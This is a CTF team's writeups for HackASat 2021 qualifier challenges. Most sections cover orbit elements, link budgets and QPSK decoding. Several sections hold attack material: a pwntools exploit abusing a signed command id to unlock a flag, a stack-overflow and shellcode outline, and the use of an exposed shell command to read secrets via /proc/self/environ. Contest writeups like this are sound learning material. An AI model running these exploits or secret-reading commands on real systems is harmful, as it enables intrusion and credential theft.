# OneSmallHackForMan
# HackASat 2021 Quals writeups

Solution scripts can be found at: https://gist.github.com/trupples/5cc02e24d1d639fe62ecea3ad03aa892

## Fiddlin' John Carson

*Writeup by trupples*

This challenge consists in computing [Keplerian Orbital Elements](https://en.wikipedia.org/wiki/Orbital_elements#Keplerian) given the instantaneous position and velocity of a satellite:

```
         KEPLER        
        CHALLANGE      
       a e i Ω ω υ     
            .  .       
        ,'   ,=,  .    
      ,    /     \  .  
     .    |       | .  
    .      \     / .   
    +        '='  .    
     .          .'     
      .     . '        
         '             
Your spacecraft reports that its Cartesian ICRF position (km) and velocity (km/s) are:
Pos (km):   [8449.401305, 9125.794363, -17.461357]
Vel (km/s): [-1.419072, 6.780149, 0.002865]
Time:       2021-06-26-19:20:00.000-UTC

What is its orbit (expressed as Keplerian elements a, e, i, Ω, ω, and υ)?
```

While we found a [very useful Space Exploration stackexchange answer on this exact topic](https://space.stackexchange.com/a/1919), due to some initial implementation errors we opted to use a preexisting library, namely [pyorbital](https://github.com/pytroll/pyorbital), which has a function for this exact task:

```py
# ...
# receive code
# ... 

import orbital
import orbital.utilities

r = orbital.utilities.XyzVector(x, y, z)
v = orbital.utilities.XyzVector(vx, vy, vz)
elems = orbital.elements_from_state_vector(r, v, orbital.earth_mu)
print(elems)

a = elems.a / 1000
e = elems.e
i = elems.i * 180 / 3.141592643586535
Omega = elems.raan * 180 / 3.141592643586535
omega = elems.arg_pe * 180 / 3.141592643586535
nu = elems.f * 180 / 3.141592643586535

p.sendlineafter("Semimajor axis, a (km):", '{:.6f}'.format(a))
p.sendlineafter("Eccentricity, e:", '{:.6f}'.format(e))
p.sendlineafter("Inclination, i (deg): ", '{:.6f}'.format(i))
p.sendlineafter("Right ascension of the ascending node, Ω (deg):", '{:.6f}'.format(Omega))
p.sendlineafter("Argument of perigee, ω (deg):", '{:.6f}'.format(omega))
p.sendlineafter("True anomaly, υ (deg):", '{:.6f}'.format(nu))

p.interactive()
```

It is worth mentioning that the server only accepted floats formatted to exactly 6 decimal places (123.450000) which annoyed us a bit and made us think we had computation errors throughout.


## Linky

*Writeup by amadan, (trupples)*

```
 _     _       _
| |   (_)_ __ | | ___   _
| |   | | '_ \| |/ / | | |
| |___| | | | |   <| |_| |
|_____|_|_| |_|_|\_\\__, |
                    |___/
    .-.
   (;;;)
    \_|
      \ _.--l--._
     . \    |     `.
   .` `.\   |    .` `.
 .`     `\  |  .`     `.
/ __      \.|.`      __ \/
|   ''--._ \V  _.--''   |
|        _ (") _        |
| __..--'   ^   '--..__ | 
\         .`|`.         /-.)
 `.     .`  |  `.     .`
   `. .`    |    `. .`
     `._    |    _.`|
         `--l--`  | |
                  | |
                  | |
                  | |
         o        | |     o
          )    o  | |    (
         \|/  (   | |   \|/
             \|/  | | o  WWwwwW
                o | |  )  
        WWwwWww ( | | \|/
               \|/WWwwWWwW


Our satellite has launched, but the user documentation and Critical Design Review package 
for the Telemetry link are missing a few key details. Fill in the details to configure
the Telemetry Transmitter and solve the challenge.


Here's the information we have captured

************** Global Parameters *****************
Frequency (Hz): 12100000000.0
Wavelength (m): 0.025
Data Rate (bps): 10000000.0
************* Transmit Parameters ****************
Transmit Line Losses (dB): -1
Transmit Half-power Beamwidth (deg): 26.30
Transmit Antenna Gain (dBi): 16.23
Transmit Pointing Error (deg): 10.00
Transmit Pointing Loss (dB): -1.74
*************** Path Parameters ******************
Path Length (km): 2831
Polarization Loss (dB): -0.5
Atmospheric Loss (dB): -2.1
Ionospheric Loss (dB): -0.1
************** Receive Parameters ****************
Receive Antenna Diameter (m): 5.3
Receive Antenna Efficiency: 0.55
Receive Pointing Error (deg): 0.2
Receive System Noise Temperature (K): 522
Receive Line Loss (antenna to LNA) (dB): -2
Receive Demodulator Implementation Loss (dB): -2
Required Eb/No for BER (dB): 4.4

Calculate and provide the recieve antenna gain in dBi: 
```

The challenge provides several pieces of information about the parameters of working satellite,
and requires us to compute 3 other parameters, in order to achieve communication with a
ground station.

We can calculate the receive antenna gain using the following formula ([source](https://www.electronics-notes.com/articles/antennas-propagation/parabolic-reflector-antenna/antenna-gain-directivity.php))

![`G = 10 \log_{10}{k \left( \frac{\pi \cdot D}{\lambda} \right)^2 }`](./linky-1.png)
 
Where k = 0.55 is the Receive Antenna Efficiency, D = 5.3 is the Receive Antenna Diameter, and λ = 0.025 is the Wavelength. The answer is approximately 53.87

Then we need the ground terminal G/T, which we obtain by subtracting some losses from the receive gain:

![`G - 10 \log_{10}{T} - L \approx 24.69`](./linky-2.png)

where T = 522 is the Receive System Noise Temperature, and L = 2 is the Receive Line Loss.

The last question to answer is:
   "Determine the transmit power (in W) to achieve 10dB of Eb/No margin (above minimum for BER):"

We used equation A.2.2.3.6 from https://engineering.purdue.edu/AAECourses/aae450/2008/spring/report_archive/report2nddraftuploads/appendix/avionics/A.2.2.3%20Link%20Budget%20Analysis.doc, with some adaptation to account for the noise term:

Eb/N0 = P + Lt + Gt + Ls + Gr + Lr + noise

where:
Eb/N0 = 14.4, 10 above the 4.4 minimum for BER
Lt = transmitter cumulative error
Gt = trasmitter gain
Ls = free space path loss
Gr = receiver gain
Lr = receiver loss
noise = the noise term, influenced by the temperature and the data rate

Whe have all the information either from the start of the challenge or from solving the
first two questions and so we get the flag.

```
flag{charlie829650delta2:GI_Fk4ep40yaB-dnSlSCP_mSkkXy46DtQrGGXo3SbDu87OTbDfw_Ca8YQGHLvdpBpiv6kVtJxk6b4rbn_VnOeIY}
```

## Hindsight

*Writeup by amadan*

The challenge is similar to "Attitude Adjustment", Spacebook and "My 0x20" from last year's qualifiers.
However, unlike last year, we lack the brightness for each star.

We can use the fact that the stars preserve their position relative to each other, in the context
of the CTF. We can, for each star, compute the euclidean distances to the other stars. We have over 1700
stars in the catalog and 32 stars in each of the 5 rounds.

To identify a star we would take it's 32 distances from the challenge and try to match them with
the ones in the catalog and we would have a row in the catalog which has 32 distances equal to 
the ones in the challenge. Since the measurements are subject to errors and the floating point
calculations are subject to errors as well, we consider a match as the row in the catalog which
minimizes the differece (error) it's distances and the ones in the challenge.

This approach works reasonably well for the first two rounds of the challenge, but then the
computations take just a little too long. We could have tried to optimize things. But since the
challenge rounds do not change between attempts, we just let the computation finish and hardcode
the answer for the next attempt.

``flag{yankee490644echo2:GIWYaDFVjY6SVgHiqJxXAK7RmcIKjLeiaJJhurpcxo-lT08D4NUwvOI-2_HNIo_L1ahlmtFMqLeHimKjTgJL5oY}`


## Take out the trash

*Writeup by trupples*

This is one of the coolest and most fun tasks of the CTF! The challenge consists in tracking multiple satellites and bits of space junk over a period of time and carefully scheduling the satellites to shoot at incoming space junk.

We are given [Two Line Element](https://en.wikipedia.org/wiki/Two-line_element_set) descriptions of 59 pieces of space junk and 15 satellites we can control. Each satellite has a laser with a range of 100km and we must not allow any space junk to get within 10km of any satellite. We win when we successfully shoot at least 51 pieces of space junk.

By some sane intuition about the size of the problem, we can assume it's ok to check the state every minute, as opposed to, say, every second, which would be too fine and slow down our computation, or every hour, which would be too coarse and would lead to many pieces of junk flying past our defenses untouched.

Using a library like [skyfield](https://rhodesmill.org/skyfield/), we can easily manage lists of satellites and query their positions at any given time:

```py
from skyfield.api import load
from astropy import units as u
from astropy.time import Time

satellites = load.tle_file("sats.tle")
enemies = load.tle_file("spacejunk.tle")
ts = load.timescale()

# Print the position of Sat1 in the first moment:
at = Time("2021-06-26T00:00:00.000")
t = ts.from_astropy(at)
print(satellites[0].at(t).position.km)

# Print the position of SpaceJunk11 after 15seconds:
at += 15 * u.s
t = ts.from_astropy(at)
print(enemies[10].at(t).position.km)
```

Our solution waits minute by minute until any space junk is within the 100km range of any satellite, case in which we shoot it down and remove it from the list:

```py
num_kills = 0
while num_kills < 51:
    t = ts.from_astropy(at)

    pp = None
    for sat in satellites:
        for enemy in enemies:
            sp = sat.at(t).position.km
            ep = enemy.at(t).position.km
            if norm(ep - sp) < 100:
                pewpew(sat, enemy, t)
                pp = enemy
                break
        if pp:
            enemies.remove(pp)
            num_kills += 1
            break

    at += 60 * u.s # Advance time 60 seconds
```

The `pewpew` function calculates the direction the satellite should point in as a rotation quaternion, formats the time as requested by the server, and sends a suitable "FIRE" command:

```py
def pewpew(sat, enemy, t):
    sp = sat.at(t).position.km
    ep = enemy.at(t).position.km
    dp = ep - sp

    dist = norm(dp)

    # normalized delta position = direction the satellite should look towards
    dp /= dist

    # Calculate the rotation quaternion corresponding to turning from [0, 0, 1] to dp:
    # https://stackoverflow.com/a/1171995
    # https://www.wolframalpha.com/input/?i=cross+product+%5Bx%2C+y%2C+z%5D+with+%5B0%2C+0%2C+1%5D
    qx = -dp[1]
    qy = dp[0]
    qz = 0
    qw = norm(dp) + dp[2]

    # Normalize the rotation quaternion
    q_len = norm([qx, qy, qz, qw])
    qx /= q_len
    qy /= q_len
    qz /= q_len
    qw /= q_len

    # Format the time
    utc = at.value
    ymd, hms = utc.split("T")
    y, m, d = ymd.split("-")
    h, mi, s = hms.split(":")
    s = s.split(".")[0]
    assert m == "06"
    assert y == "2021"

    formatted = "2021" + str(151 + int(d, 10)) + "." + h + mi + s

    # Send the command
    print(f"{formatted} {sat.name.upper()} FIRE {qx} {qy} {qz} {qw} {dist}")
    r.sendlineafter(":", f"{formatted} {sat.name.upper()} FIRE {qx} {qy} {qz} {qw} {dist}")

```

## tree in the forest

*Writeup by trupples*

This challenge consists in exploiting a C program with incomplete memory bounds checks, given its source code.

[The program](../parser.c) starts a TCP server for 60 seconds which listens for packets in the following format:

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            version            |              type             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                               id                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

```

Where `id` *should* (hehe) be one of:

```c
typedef enum command_id_type {
   COMMAND_ADCS_ON =       0,
   COMMAND_ADCS_OFF =      1,
   COMMAND_CNDH_ON =    2,
   COMMAND_CNDH_OFF =      3,
   COMMAND_SPM =        4,
   COMMAND_EPM =        5,
   COMMAND_RCM =        6,
   COMMAND_DCM =        7,
   COMMAND_TTEST =         8,
   COMMAND_GETKEYS =    9, // only allowed in unlocked state
} command_id_type;
```

This is checked with the condition `header->id >= COMMAND_LIST_LENGTH`, but as `command_id_type` defaults to a signed type, we can send a "negative" id in the packet, to trick it into passing this check.

For each valid packet, the program increments a slot in the `command_log` array. While we can not overflow this array "to the right", a negative packet id will effectively allow us to increment any byte that comes "before" this array in memory. Fortunately, the `lock_state` variable, which dictates whether we may get the flag or not, is positioned 8 bytes before `command_log`:

```
$ nm parser
[ ... ]
0000000000203038 B command_log
[ ... ]
0000000000203030 B lock_state
[ ... ]
```

Thus, by sending a packet with id -8, we can increment the least significant byte of `lock_state`. Doing so 255 times will take it from its initial value of 1=LOCKED to 0=UNLOCKED, after which we can just get the flag with a packet of id 9=COMMAND_GETKEYS:

```py
from pwn import *

rr = remote("lucky-tree.satellitesabove.me", 5008)
rr.sendlineafter("Ticket please:", "ticket{...}")

rr.recvuntil("Starting up Service on udp:")
ip = rr.recvuntil(":", drop=True)
port = int(rr.recvline().strip())

r = remote(ip, port, typ='udp')

def send_command(ver, typ, id):
   r.send(p16(ver) + p16(typ) + p32(id))
   print(r.clean(timeout=0).decode(), end='')

for i in range(255):
   send_command(1, 1, 0x100000000 - 8)

send_command(1, 1, 9)

r.interactive()

```

## Mongoose Mayhem

Solved by trupples, but unfortunately I did not manage my time well enough to do a detailed explanation, though I really enjoyed this task. It was quite cool and complex! The steps I took boil down to:
1. properly load the ROM in your favourite decompiler (I initially tried IDA but Ghidra managed the control flow better), keeping in mind that the firmware does virtual memory mapping
2. understanding the communications protocol: all valid packets start with A5 5A and 63 bytes of data, which are interpreted as: one command id byte, a checksum byte (the sum of all packet bytes must be congruent to -1 mod 256), and 61 bytes of arbitrary data.
3. Analyse the 8 commands, one of which (id=5) is vulnerable to a stack-based buffer overflow, allowing us to overwrite the return pointer to control code flow. Since the emulated processor does not have any Data Execution Prevention, we can...
4. Write MIPS shellcode to access the flag device and send it to us via UART. A notable difficulty was managing far jumps, as well as the 4-byte code alignment MIPS expects. The "normal" MIPS jump command only changes the lower 26 bits of the address, while the bits of shellcode were in completely different regions of memory.  

The solver script is available at the link found at the beginning of this document. It contains some commented shellcode attempts, partially documenting my journey.

## Grade F Prime Beef

*Writeup by trupples*

This challenge consists in using an [F prime](https://nasa.github.io/fprime/) application to run commands on a remote satellite and read secret data from its system.

To start, we connect to the given challenge port and get an URL and a countdown timer:

![netcat session with ticket and received URL](gfpb-1.png)

On the linked website, we see a dashboard

![Web dashboard with a dropdown of commands, a button to send a selected command, and a list of previously sent commands](gfpb-2.png)

with a list of commands we may send to the satellite. Among them, the following are of exceptional interest:

![Commands in the dropdown referencing the flag, files, and downlinking](gfpb-3.png)

because they relate to something called the flag server, as well as manipulating and downlinking files and running commands. For starters, we use the `fileManager.ShellCommand` and `fileDownlink.SendFile` commands to get a sense of the remote system, by running some `ls` commands and downlinking the reseults:

![Command log with a ls shell command and a file downlink of the output](gfpb-4.png)

which we can retrieve in the "Downlink" tab of the dashboard:

![Downlink interface with a list of sent files and download buttons](gfpb-5.png)

The `ls` results are:

```
ls
ls.txt
satellite.exe

ls /
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
run.sh
run_ground.sh
run_space.sh
sbin
srv
sys
tmp
usr
var
```

`satellite.exe` is surely interesting, but we decided to also take a look at the `run.sh`, `run_ground.sh` and `run_space.sh` files, as they probably have initialisation code and might hint as to where the flag is stored and/or retreived from. We run `cat /run*.sh` and among the output we see:

```sh
FLAG=$1
cd /home/space/fprime/
export SAT_FLAG=${FLAG}
./satellite.exe -a 127.0.0.1 -p 50000 > /tmp/satellite.log 2>&1 &
sleep 5
export SAT_FLAG="ThisIsNotTheFlagYouAreLookingFor"
```

which means the flag is stored as an environment variable, but won't be exposed to the shell after the script is run. Fortunately, the commands we run are executed by `satellite.exe`, so we can get the flag by reading all environment variables with `cat /proc/self/environ`:

```
MAIL=/var/mail/space
USER=space
SHLVL=0
HOME=/home/space
OLDPWD=/home/space
LOGNAME=space
_=./satellite.exe
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
SAT_FLAG=ThisIsNotTheFlagYouAreLookingFor
SHELL=/bin/bash
PWD=/home/space/fprime
FLAG=flag{golf81024juliet2:GHonYJa99vgohUnpnwkCDAFOOIYQwgeX_whXuvek0CQ-XMDWiQIwjUBB291R0m143kHnHtEG3z8Ybnbz2g_sB5Y} 
```

where we see both the overwritten `SAT_FLAG` as well as the `FLAG` variable with the actual flag.

## IQ

*Writeup by amadan*

The challenge greets us with:

```
    IQ Challenge
       QPSK Modulation   
              Q
              |          
        01    |     11   
        o     |+1   o    
              |          
              |          
        -1    |     +1   
    ===================== I
              |          
              |          
        00    |     10   
        o     |-1   o    
              |          
              |          
    Convert the provided series of transmit bits into QPSK I/Q samples
                      |Start here
                      v
    Bits to transmit: 01000011 01110010 01101111 01101101 01110101 01101100 01100101 01101110 01110100 00001010
    Provide as interleaved I/Q e.g. 1.0 -1.0 -1.0  1.0 ... 
                                     I    Q    I    Q  ...
```

It is just a matter of remapping the bits to their in-phase and quadrature correspondents:
```py
qpsk = {
        b'01': (-1.0, 1.0),
        b'11': (1.0, 1.0),
        b'10': (1.0, -1.0),
        b'00': (-1.0, -1.0)
}
```

`flag{november253757uniform2:GIESE6u1w76LxNKxheGRGPIRH6Cv_PZBICNGZeKwLplPSyfvt_krB0W_XOC_blsstQ8wC1FqHaomSV3gtYIs7O8}`

## credence clearwater space data systems

*Writeup by trupples*

This challenge consists in decoding the given IQ components of a radio signal.

We are given a python-syntax array of 1968 complex numbers:

```py
v = [-0.8459118149833651+0.7527495864759419j,
-0.6069350439777554+0.912831084339561j,
-0.6860798392875944+0.80246772373311j,
# ... 1963 omitted lines ...
-0.9874991644331665-0.6077091743517318j,
-0.5579991036315813-0.4906613711404457j]
```

If we plot them, we observe something very reminescent of a QPSK constellation diagram:

![Scatter plot with 4 distinct concentrated blobs at the corners of an immaginary square](credence-1.png)

By this, it is safe to assume this signal encodes binary data 2 bits at a time.

We interpret each one of the 4 "zones" as one of 4 symbols, named ABCD (as we don't have a bit representation yet). If we look what each value in our array maps to, we get:

```
CCCCDDDDBBBBBBBBAAAACCCCAAAAAAAAAAAAAAAAAAAACCCCCCCCDDDDAAAADDDDCCCCCCCCCCCCCCCC
CCCCCCCCCCCCDDDDAAAACCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDAAAACCCCCCCC
DDDDBBBBDDDDBBBBDDDDBBBBAAAACCCCDDDDBBBBCCCCDDDDDDDDBBBBDDDDAAAADDDDAAAABBBBAAAA
DDDDAAAACCCCDDDDDDDDAAAADDDDDDDDDDDDBBBBDDDDDDDDDDDDBBBBCCCCBBBBDDDDBBBBDDDDDDDD
DDDDBBBBCCCCAAAACCCCAAAADDDDBBBBCCCCAAAABBBBDDDDCCCCAAAACCCCAAAACCCCAAAACCCCCCCC
CCCCAAAADDDDAAAACCCCAAAADDDDAAAADDDDAAAABBBBDDDDDDDDBBBBCCCCDDDDDDDDBBBBAAAABBBB
DDDDBBBBBBBBAAAADDDDBBBBDDDDDDDDDDDDBBBBDDDDDDDDCCCCAAAACCCCBBBBCCCCAAAABBBBBBBB
DDDDCCCCDDDDAAAADDDDCCCCAAAACCCCDDDDDDDDCCCCDDDDDDDDBBBBDDDDCCCCDDDDCCCCAAAADDDD
DDDDBBBBAAAADDDDDDDDDDDDCCCCDDDDDDDDDDDDDDDDAAAADDDDAAAACCCCAAAADDDDCCCCCCCCAAAA
DDDDAAAABBBBDDDDCCCCAAAADDDDCCCCCCCCAAAACCCCAAAADDDDDDDDCCCCDDDDDDDDAAAACCCCCCCC
DDDDAAAADDDDBBBBDDDDCCCCCCCCBBBBDDDDCCCCDDDDAAAADDDDBBBBBBBBAAAADDDDBBBBCCCCAAAA
DDDDAAAABBBBDDDDDDDDAAAADDDDCCCCCCCCBBBBAAAADDDDDDDDCCCCCCCCDDDDCCCCAAAABBBBCCCC
DDDDBBBBDDDDAAAADDDDBBBBDDDDCCCCDDDDBBBBBBBBBBBBDDDDAAAABBBBDDDDDDDDDDDDDDDDCCCC
CCCCAAAACCCCDDDDDDDDBBBBDDDDBBBBDDDDDDDDCCCCBBBBDDDDBBBBCCCCAAAACCCCAAAADDDDDDDD
DDDDCCCCDDDDDDDDDDDDCCCCAAAADDDDDDDDCCCCDDDDCCCCDDDDCCCCDDDDDDDDDDDDBBBBDDDDBBBB
DDDDAAAADDDDBBBBCCCCAAAADDDDDDDDDDDDCCCCDDDDDDDDDDDDCCCCBBBBDDDDDDDDAAAACCCCAAAA
CCCCBBBBAAAADDDDCCCCAAAABBBBDDDDDDDDCCCCBBBBBBBBDDDDAAAACCCCBBBBDDDDDDDDBBBBBBBB
DDDDBBBBDDDDCCCCDDDDAAAABBBBBBBBDDDDBBBBBBBBCCCCDDDDAAAABBBBCCCCDDDDAAAADDDDCCCC
CCCCAAAADDDDCCCCDDDDCCCCDDDDAAAADDDDAAAACCCCBBBBCCCCAAAACCCCAAAADDDDBBBBAAAADDDD
DDDDBBBBBBBBDDDDDDDDAAAACCCCAAAACCCCAAAACCCCAAAADDDDCCCCAAAACCCCDDDDCCCCDDDDCCCC
DDDDAAAABBBBBBBBDDDDCCCCBBBBAAAACCCCAAAACCCCAAAADDDDCCCCAAAAAAAACCCCBBBBAAAADDDD
DDDDDDDDDDDDBBBBCCCCAAAADDDDDDDDDDDDCCCCAAAACCCCCCCCAAAADDDDAAAADDDDBBBBDDDDCCCC
CCCCAAAADDDDAAAADDDDBBBBDDDDDDDDCCCCAAAADDDDDDDDDDDDDDDDAAAAAAAADDDDAAAADDDDCCCC
DDDDAAAABBBBBBBBCCCCAAAADDDDCCCCDDDDBBBBAAAACCCCDDDDAAAADDDDBBBBCCCCAAAACCCCBBBB
DDDDCCCCDDDDDDDDDDDDDDDDBBBBDDDDDDDDAAAAAAAADDDD
```

The signal is very clean and can be clearly split into blocks of 4 samples. Not knowing what 2 bit sequence each of the symbols maps to, we can iterate over all possible symbol-bit mappings:

```py
import itertools

symbols = v[::4]

for a, b, c, d in itertools.permutations(["00", "01", "10", "11"]):
    for pad in range(8):
        s = symbols.replace("A", a).replace("B", b).replace("C", c).replace("D", d)
        dec = bin2ascii(pad * "0" + s)
        if b'flag' in dec:
            print(dec)
            print(f"{a=} {b=} {c=} {d=}")
```

Which finds the flag and the correct symbol mapping:

```
b'\x1a\xcf\xfc\x1d\x00\x01\xc0\x00\x00pflag{quebec693077yankee2:GLQdMmQWsCy43QpvBGkcyt-A8gdjyT1fRc5EMDEfv5EIs-9JrZdzhxt4Gr3mis3LDzK3O-V5L7d7e5_tz4lv2EY}'
a='11' b='10' c='00' d='01'
```
